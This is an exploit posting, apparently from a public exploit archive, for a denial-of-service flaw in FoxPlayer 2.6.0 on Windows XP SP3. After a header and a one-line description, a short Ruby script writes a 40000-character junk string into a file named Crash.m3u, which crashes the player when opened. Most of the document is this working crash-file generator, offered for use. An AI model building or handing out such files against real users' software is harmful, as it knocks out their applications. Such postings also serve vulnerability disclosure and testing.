Denial of Service in FoxPlayer version 2.6.0
===================================================================================
# Exploit Title:Denial of Service in FoxPlayer version 2.6.0
# Download link :http://www.foxmediatools.com/installers/fox-player-setup.exe
# Author: Ahmed Elhady Mohamed
# Email : ahmed.elhady.mohamed@gmail.com
# version: version 2.6.0
# Category: DOS
# Tested on: windows XP SP3
===================================================================================
########################################DESC#######################################
#Foxplayer 2.6.0 suffers form a denial of service vulnerability ,when opening a   #
#malicious .m3u file.                                                             #
###################################################################################

#!/usr/bin/ruby
File.open "Crash.m3u" , "w" do |file|
	junk = "A" * 40000
	file.puts junk
end
